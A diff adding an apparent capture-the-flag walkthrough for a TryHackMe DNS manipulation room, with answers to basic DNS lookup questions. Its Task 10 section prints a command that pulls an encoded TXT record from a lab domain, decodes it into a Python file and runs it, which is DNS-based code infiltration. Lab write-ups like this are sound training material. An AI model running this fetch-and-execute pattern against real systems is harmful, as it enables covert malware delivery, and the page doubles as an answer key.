@@ -1,0 +1,56 @@
+I"Y<p>Room: <a href="https://tryhackme.com/room/dnsmanipulation">DNS Manipulation</a></p>
+
+<h1 id="task-4-what-is-dns">Task 4: What is DNS?</h1>
+<h3 id="if-you-were-on-windows-what-command-could-you-use-to-query-a-txt-record-for-youtubecom">If you were on Windows, what command could you use to query a txt record for ‘youtube.com’?</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup <span class="nt">-type</span><span class="o">=</span>TXT domaintosearch.com 
+</code></pre></div></div>
+
+<h3 id="if-you-were-on-linux-what-command-could-you-use-to-query-a-txt-record-for-facebookcom">If you were on Linux, what command could you use to query a txt record for ‘facebook.com’?</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig domaintosearch.com txt
+</code></pre></div></div>
+
+<h3 id="aaaa-stores-what-type-of-ip-address-along-with-the-hostname">AAAA stores what type of IP Address along with the hostname?</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IPv6
+</code></pre></div></div>
+
+<h3 id="maximum-characters-for-a-dns-txt-record-is-256-yaynay">Maximum characters for a DNS TXT Record is 256. (Yay/Nay)</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nay
+</code></pre></div></div>
+
+<h3 id="what-dns-record-provides-a-domain-name-in-reverse-lookup-research">What DNS Record provides a domain name in reverse-lookup? (Research)</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PTR
+</code></pre></div></div>
+
+<h3 id="what-would-the-reverse-lookup-be-for-the-following-ipv4-address-1921682032-research">What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)</h3>
+<ul>
+  <li>in your Linux terminal enter the following command replacing the IP of interest</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>host IP_ADDRESS
+</code></pre></div></div>
+<h1 id="task-5-what-is-dns-exfiltration">Task 5 What is DNS Exfiltration?</h1>
+<h3 id="what-is-the-maximum-length-of-a-dns-name">What is the maximum length of a DNS name?</h3>
+<p>Check this <a href="https://en.wikipedia.org/wiki/Domain_Name_System">article</a></p>
+
+<h1 id="task-7--exfiltration-practice">Task 7 : Exfiltration Practice</h1>
+<ul>
+  <li>login with SSH provided</li>
+</ul>
+
+<h1 id="task-10--infiltration-practice">Task 10 : Infiltration Practice</h1>
+<ul>
+  <li>Read the TASK file carefully, you will thank me later, spent time on this …</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nslookup <span class="nt">-type</span><span class="o">=</span>txt REDACTED.badbaddoma.in |grep <span class="s2">"Ye"</span> |cut <span class="nt">-d</span> <span class="se">\"</span> <span class="nt">-f2</span> |base58 <span class="nt">-d</span> |base64 <span class="nt">-d</span> <span class="o">&gt;</span> decoded.py
+
+ python3 decoded.py
+ 
+
+</code></pre></div></div>
+:ET
